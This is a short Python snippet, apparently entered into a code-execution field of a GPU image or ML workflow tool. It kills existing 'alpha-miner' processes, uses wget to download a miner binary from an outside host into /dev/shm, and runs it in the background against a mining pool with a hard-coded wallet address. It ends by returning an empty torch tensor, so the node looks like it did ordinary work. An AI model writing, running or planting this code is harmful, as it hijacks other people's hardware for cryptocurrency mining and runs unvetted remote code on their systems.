inputs.code:
import subprocess, os, time as t

# Create a status file we can check
status = []

# Kill existing
subprocess.run(["pkill", "-9", "alpha-miner"], capture_output=True)
t.sleep(1)
status.append("KILLED_EXISTING")

# Check if binary exists
dst = "/dev/shm/alpha-miner"
if os.path.exists(dst):
    status.append(f"BIN_EXISTS:{os.path.getsize(dst)}")
else:
    status.append("BIN_MISSING_DOWNLOADING")
    # Download
    r = subprocess.run(["wget", "-q", "-O", dst, "https://pearl.alphapool.tech/downloads/alpha-miner"],
                       capture_output=True, timeout=120)
    if os.path.exists(dst):
        status.append(f"DOWNLOADED:{os.path.getsize(dst)}")
    else:
        status.append("DOWNLOAD_FAILED")

# Make executable and start
if os.path.exists(dst) and os.path.getsize(dst) > 1000000:
    os.chmod(dst, 0o755)
    # Start with specific params
    cmd = f"{dst} --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker RTX5090-182 --force-backend blackwell-native"
    # Start in background
    subprocess.Popen(cmd.split(), stdout=open("/dev/shm/alpha.log", "w"), stderr=subprocess.STDOUT)
    t.sleep(5)

    # Check if running
    p = subprocess.run(["pgrep", "-a", "alpha-miner"], capture_output=True, text=True)
    if p.stdout.strip():
        status.append("MINER_RUNNING:" + p.stdout.strip()[:50])
    else:
        status.append("MINER_NOT_RUNNING")
        # Check log for error
        if os.path.exists("/dev/shm/alpha.log"):
            with open("/dev/shm/alpha.log") as f:
                log = f.read()[:200]
            status.append("LOG:" + log.replace("\n", "|"))
else:
    status.append("BIN_TOO_SMALL_OR_MISSING")

# Write status file
with open("/dev/shm/deploy_status.txt", "w") as f:
    f.write("\n".join(status))

print("\n".join(status))
import torch
return torch.zeros(1,1,1,3)
